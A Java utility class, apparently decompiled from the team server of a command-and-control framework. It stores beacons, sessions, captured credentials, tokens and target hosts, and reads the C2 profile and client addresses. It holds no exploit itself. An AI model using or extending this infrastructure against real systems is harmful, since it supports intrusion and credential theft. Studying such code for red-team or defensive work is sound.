package server;

import beacon.BeaconPayload;
import c2profile.Profile;
import common.BeaconEntry;
import common.CommonUtils;
import common.GenericEvent;
import common.StringStack;

import java.util.HashMap;
import java.util.Map;

public class ServerUtils {
    public static Profile getProfile(Resources resources) {
        return (Profile) resources.get("c2profile");
    }

    public static String randua(Resources resources) {
        return BeaconPayload.randua(getProfile(resources));
    }

    public static WebCalls getWebCalls(Resources resources) {
        return (WebCalls) resources.get("webcalls");
    }

    public static boolean hasPublicStage(Resources resources) {
        return getProfile(resources).option(".host_stage");
    }

    public static String getMyIP(Resources resources) {
        return (String) resources.get("localip");
    }

    public static String getServerPassword(Resources resources, String string) {
        return (String) resources.get("password");
    }

    public static BeaconEntry getBeacon(Resources resources, String string) {
        return ((Beacons) resources.get("beacons")).resolve(string);
    }

    public static void addToken(Resources resources, String string1, String string2, String string3) {
        HashMap hashMap = new HashMap();
        hashMap.put("token", string1);
        hashMap.put("email", string2);
        hashMap.put("cid", string3);
        resources.call("tokens.add", CommonUtils.args(CommonUtils.TokenKey(hashMap), hashMap));
    }

    public static void addSession(Resources resources, Map map) {
        map.put("opened", System.currentTimeMillis() + "");
        resources.call("sessions.addnew", CommonUtils.args(CommonUtils.SessionKey(map), map));
        resources.call("sessions.push");
    }

    public static void addC2Info(Resources resources, Map map) {
        resources.call("c2info.addnew", CommonUtils.args(CommonUtils.C2InfoKey(map), map));
        resources.call("c2info.push");
    }

    public static void addCredential(Resources resources, String string1, String string2, String string3, String string4, String string5, long l) {
        HashMap hashMap = new HashMap();
        hashMap.put("user", string1);
        hashMap.put("password", string2);
        hashMap.put("realm", string3);
        hashMap.put("source", string4);
        hashMap.put("host", string5);
        if (l > 0L)
            hashMap.put("logon", Long.toString(l));
        String str = CommonUtils.CredKey(hashMap);
        resources.call("credentials.addnew", CommonUtils.args(str, hashMap));
    }

    public static void addCredential(Resources resources, String string1, String string2, String string3, String string4, String string5) {
        addCredential(resources, string1, string2, string3, string4, string5, 0L);
    }

    public static void addTarget(Resources resources, String string1, String string2, String string3, String string4, double d) {
        HashMap hashMap = new HashMap();
        hashMap.put("address", string1);
        if (string2 != null)
            hashMap.put("name", string2);
        if (string3 != null)
            hashMap.put("note", string3);
        if (string4 != null)
            hashMap.put("os", string4);
        if (d != 0.0D)
            hashMap.put("version", d + "");
        String str = CommonUtils.TargetKey(hashMap);
        resources.call("targets.update", CommonUtils.args(str, hashMap));
        resources.call("targets.push");
    }

    public static void fireEvent(Resources resources, String string1, String string2) {
        resources.broadcast("propagate", new GenericEvent(string1, string2));
    }

    public static String getRemoteAddress(Profile profile, Map map) {
        boolean bool = profile.option(".http-config.trust_x_forwarded_for");
        if (bool && map.containsKey("X-Forwarded-For")) {
            String str1 = (String) map.get("X-Forwarded-For");
            if (str1.indexOf(",") > -1) {
                str1 = CommonUtils.strrep(str1, " ", "");
                StringStack stringStack = new StringStack(str1, ",");
                str1 = stringStack.shift();
            }
            if (CommonUtils.isIP(str1) || CommonUtils.isIPv6(str1))
                return str1;
            CommonUtils.print_error("remote address '" + (String) map.get("X-Forwarded-For") + "' in X-Forwarded-For header is not valid.");
        }
        String str = (String) map.get("REMOTE_ADDRESS");
        return "".equals(str) ? "" : str.substring(1);
    }
}
